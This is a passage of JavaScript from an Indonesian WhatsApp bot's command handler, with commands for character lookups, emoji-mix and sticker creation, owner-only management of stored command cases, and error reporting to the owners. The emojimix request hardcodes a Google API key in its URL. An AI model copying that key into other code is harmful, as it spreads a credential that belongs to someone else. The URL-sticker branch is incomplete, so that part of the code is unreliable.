                    } else {
                        await m.reply('❌ Jadwal sholat tidak ditemukan. Pastikan nama kota sesuai.');
                    }
                } catch (error) {
                    await m.reply('❌ Terjadi kesalahan saat mengambil data!');
                }
            }
            break;
            case "zzz": {
                let list = await Scraper.zzz.list();
                if (!text) return m.reply("> *🔍 Masukkan nama karakter dari game ZZZ*");

                let chara = list.find((a) => a.name.toLowerCase() === text.toLowerCase());
                if (!chara) return m.reply(`> *😞 Karakter tidak ditemukan!*

*– 乂 Berikut ${list.length} karakter dari game ZZZ:*

${list.map((a) => Object.entries(a).map(([a, b]) => `> *🔸 ${a.capitalize()}* : ${b}`).join('\n')).join("\n\n")}`);

                let data = await Scraper.zzz.chara(text);
                let cap = "*– 乂 **Zenless Zone Zero - Detail Karakter***\n"
                cap += Object.entries(data.info).map(([a, b]) => `> *🔹 ${a.capitalize()}* : ${b}`).join("\n");
                cap += "\n\n*– **Statistik Karakter** :*\n"
                cap += data.stats.map((a) => `> *🔸 ${a.name.capitalize()}* : ${a.value}`).join("\n");
                cap += "\n\n*– **Info Tim Karakter** :*\n"
                cap += data.team.map((a) => `> *🔹 Nama*: ${a.name}\n> *🔸 Peran*: ${a.role}`).join("\n\n");

                cap += "\n\n*– **Kemampuan Karakter** :*\n"
                cap += data.skills.map((a) => `> *🔸 Nama Kemampuan*: ${a.name}\n> ${a.description}`).join("\n\n");

                m.reply({
                    text: cap,
                    contextInfo: {
                        externalAdReply: {
                            title: `– **Zenless Zone Zero Wiki**: ${data.info.name}`,
                            body: `- **Elemen**: ${data.info.element}`,
                            mediaType: 1,
                            thumbnailUrl: data.info.image
                        }
                    }
                });
            }
            break;
            case "emojimix": {
                if (!text) return m.reply("> Mohon masukkan dua emoji! Contoh: 😂+😛");

                let [emoji1, emoji2] = text.split(/[,|\-+&]/);
                if (!emoji1 || !emoji2) return m.reply("⚠️ Format salah! Gunakan: emoji1+emoji2");

                try {
                    let anu = await Func.fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`);

                    if (!anu.results || !Array.isArray(anu.results) || anu.results.length === 0) {
                        return m.reply("❌ Gagal menemukan kombinasi emoji.");
                    }

                    let res = anu.results[0];
                    let imageUrl = res.url || res.media_formats?.png_transparent?.url;
                    if (!imageUrl) return m.reply("⚠️ Emoji tidak ditemukan.");
                    let buffer = await Func.fetchBuffer(imageUrl);
                    let cuqi = await fromBuffer(buffer);

                    let sticker = await writeExif({
                        mimetype: cuqi.mime,
                        data: buffer
                    }, {
                        packName: config.sticker.packname,
                        packPublish: config.sticker.author
                    });

                    await m.reply({
                        sticker
                    });
                } catch (err) {
                    console.error(err);
                    m.reply("⚠️ Terjadi kesalahan: " + err.message);
                }
            }
            break;
            case "sticker":
            case "s": {
                if (/image|video|webp/.test(quoted.msg.mimetype)) {
                    let media = await quoted.download();
                    if (quoted.msg?.seconds > 10)
                        throw "> *⚠️ Video lebih dari 10 detik tidak dapat dijadikan sticker*.";

                    let exif;
                    if (text) {
                        let [packname, author] = text.split(/[,|\-+&]/);
                        exif = {
                            packName: packname ? packname : "",
                            packPublish: author ? author : "",
                        };
                    } else {
                        exif = {
                            packName: config.sticker.packname,
                            packPublish: config.sticker.author,
                        };
                    }

                    let sticker = await writeExif({
                        mimetype: quoted.msg.mimetype,
                        data: media
                    }, exif);

                    await m.reply({
                        sticker
                    });
                } else if (m.mentions.length !== 0) {
                    for (let id of m.mentions) {
                        await delay(1500);
                        let url = await sock.profilePictureUrl(id, "image");
                        let media = await axios
                            .get(url, {
                                responseType: "arraybuffer",
                            })
                            .then((a) => a.data);
                        let sticker = await writeExif(media, {
                            packName: config.sticker.packname,
                            packPublish: config.sticker.author,
                        });
                        await m.reply({
                            sticker
                        });
                    }
                } else if (
                    /(https?:\/\/.*\.(?:png|jpg|jpeg|webp|mov|mp4|webm|gif))/i.test(
                        text,
                    )
                ) {
                    for (let url of Func.isUrl(text)) {
                        await delay(1500);
                    }
                } else {
                    m.reply("> *📸 Balas dengan foto atau video untuk dijadikan sticker*.");
                }
            }
            break;
            case "cases": {
                if (!m.isOwner) return m.reply(config.messages.owner);

                let cap = "*– 乂 **Cara Penggunaan Fitur Case***\n";
                cap += "> *➕ `--add`* untuk menambah fitur case baru\n";
                cap += "> *🔄 `--get`* untuk mengambil fitur case yang ada\n";
                cap += "> *❌ `--delete`* untuk menghapus fitur case\n";
                cap += "\n*– 乂 **Daftar Case yang Tersedia** :*\n";
                cap += Case.list().map((a, i) => `> *${i + 1}.* ${a}`).join("\n");

                if (!text) return m.reply(cap);

                if (text.includes("--add")) {
                    if (!m.quoted) return m.reply("> *⚠️ Balas dengan fitur case yang ingin disimpan*.");
                    let status = Case.add(m.quoted.body);
                    m.reply(status ? "> *✅ Berhasil menambahkan case baru!*" : "> *❌ Gagal menambahkan case baru*.");
                } else if (text.includes("--delete")) {
                    let input = text.replace("--delete", "").trim();
                    if (!input) return m.reply("> *⚠️ Masukkan nama case yang ingin dihapus*!");
                    let status = Case.delete(input);
                    m.reply(status ? `> *✅ Berhasil menghapus case: ${input}!*` : `> *❌ Case ${input} tidak ditemukan. Periksa daftar case yang tersedia*.`);
                } else if (text.includes("--get")) {
                    let input = text.replace("--get", "").trim();
                    if (!input) return m.reply("> *⚠️ Masukkan nama case yang ingin diambil*!");
                    if (!Case.list().includes(input)) return m.reply("> *❌ Case tidak ditemukan!*");
                    let status = Case.get(input);
                    m.reply(status ? status : `> *❌ Case ${input} tidak ditemukan. Periksa daftar case yang tersedia*.`);
                }
            }
            break;
        }
    } catch (error) {
        if (error.name) {
            for (let owner of config.owner) {
                let jid = await sock.onWhatsApp(owner + "@s.whatsapp.net");
                if (!jid[0].exists) continue;
                let caption = "*– 乂 *Error Terdeteksi* 📉*\n"
                caption += `> *-* Nama command : ${m.command}\n`
                caption += `\n\n${Func.jsonFormat(error)}`

                sock.sendMessage(owner + "@s.whatsapp.net", {
                    text: caption
                })
            }
            m.reply("*– 乂 *Error Terdeteksi* 📉*\n !*\n> Command gagal dijalankan karena terjadi error\n> Laporan telah terkirim kepada owner kami dan akan segera di perbaiki !");
        } else {
            m.reply(Func.jsonFormat(error));
        }
    }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log("- Terjadi perubahan pada files case.js");
    delete require.cache[file];
});